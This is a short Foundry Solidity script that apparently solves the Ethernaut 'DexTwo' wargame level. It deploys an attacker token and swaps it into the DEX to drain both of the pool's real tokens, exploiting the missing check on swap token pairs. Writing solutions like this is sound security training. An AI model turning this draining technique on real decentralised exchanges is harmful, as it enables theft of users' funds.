// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/23_DexTwo.sol";
import "contracts/23_DexTwo.sol";

contract AttackerDexTwoScript is Script {
    DexTwo dexTwo = DexTwo(vm.envAddress("INSTANCE"));
    address token1;
    address token2;
    AttackerDexTwo tokenAttacker;

    function toksLog() internal view {
        console.log("token1 msg.sender", SwappableTokenTwo(token1).balanceOf(msg.sender));
        console.log("token2 msg.sender", SwappableTokenTwo(token2).balanceOf(msg.sender));
        console.log("token1     dexTwo", SwappableTokenTwo(token1).balanceOf(address(dexTwo)));
        console.log("token2     dexTwo", SwappableTokenTwo(token2).balanceOf(address(dexTwo)));
    }

    function run() external {
        vm.startBroadcast();

        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
        tokenAttacker = new AttackerDexTwo();

        dexTwo.approve(address(dexTwo), 1000);

        dexTwo.swap(address(tokenAttacker), address(token1), 1);
        dexTwo.swap(address(tokenAttacker), address(token2), 1);

        toksLog();

        vm.stopBroadcast();
    }
}
